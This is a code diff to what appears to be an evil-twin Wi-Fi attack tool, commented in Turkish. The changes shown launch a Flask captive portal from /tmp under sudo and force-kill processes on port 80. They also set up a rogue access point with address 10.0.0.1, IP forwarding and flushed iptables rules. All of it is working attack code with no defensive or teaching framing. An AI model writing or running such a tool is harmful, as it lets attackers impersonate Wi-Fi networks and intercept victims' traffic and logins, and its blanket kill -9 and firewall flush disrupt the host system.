@@ -88,8 +88,15 @@ if __name__ == "__main__":
     with open("/tmp/flask_portal.py", "w") as f:
         f.write(portal_code)
     print(t("eviltwin_portal_starting"))
-    subprocess.run(["sudo", "fuser", "-k", "80/tcp"], capture_output=True)
+    # Port 80 temizliği (fuser yoksa lsof dene)
+    if any(os.path.exists(p) for p in ["/usr/bin/fuser", "/bin/fuser", "/usr/sbin/fuser"]):
+        subprocess.run(["sudo", "fuser", "-k", "80/tcp"], capture_output=True)
+    else:
+        # Alternatif temizlik
+        os.system("sudo lsof -t -i:80 | xargs -r sudo kill -9 > /dev/null 2>&1")
+    
     return subprocess.Popen(["sudo", "python3", "/tmp/flask_portal.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 
 
 # --- ROUGE AP SETUP (Sahte Erişim Noktası) ---
@@ -102,9 +109,14 @@ def start_evil_twin(iface, ssid, channel):
 
     subprocess.run(["sudo", "rfkill", "unblock", "wifi"])
     time.sleep(1)
-    subprocess.run(["sudo", "ifconfig", iface, "down"])
-    subprocess.run(["sudo", "iwconfig", iface, "mode", "managed"], capture_output=True)
-    subprocess.run(["sudo", "ifconfig", iface, "10.0.0.1", "netmask", "255.255.255.0", "up"])
+    
+    # Modern komutlar (ip/iw)
+    engine.run_cmd(["sudo", "ip", "link", "set", iface, "down"])
+    engine.run_cmd(["sudo", "ip", "addr", "flush", "dev", iface]) # Eski IP'leri temizle
+    engine.run_cmd(["sudo", "iw", "dev", iface, "set", "type", "managed"])
+    engine.run_cmd(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
+    engine.run_cmd(["sudo", "ip", "link", "set", iface, "up"])
+
     subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
     subprocess.run(["sudo", "iptables", "-F"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
